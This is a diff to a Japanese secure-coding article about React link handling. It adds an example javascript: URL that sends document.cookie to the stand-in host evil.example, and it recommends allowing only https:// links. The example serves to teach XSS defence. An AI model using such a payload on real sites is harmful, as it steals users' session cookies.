@@ -110,11 +110,17 @@ import DOMPurify from "dompurify";
 もう 1 つ見落としがちなのが、リンク先です。
 
 ```tsx
-// ❌ url がユーザー入力なら、"javascript:悪意あるコード" を仕込める
+// ❌ url がユーザー入力なら、javascript: スキームを仕込める
 <a href={user.websiteUrl}>ウェブサイト</a>
 ```
 
-`javascript:` で始まる URL は、クリックした瞬間にコードとして実行されます。タグを挿入していないのにスクリプトが動く、エスケープでは防げない経路です。ユーザー入力を `href` に使うなら、「`https://` で始まるものだけ許可する」という検証が必要です。
+ユーザーが `websiteUrl` にこんな値を登録したとします。
+
+```
+javascript:fetch('https://evil.example/?cookie=' + document.cookie)
+```
+
+これはリンクとして表示され、クリックした瞬間に JavaScript として実行されます。タグを挿入していないのにスクリプトが動く、エスケープでは防げない経路です。ユーザー入力を `href` に使うなら、「`https://` で始まるものだけ許可する」という検証が必要です。
 
 ## まとめ
 
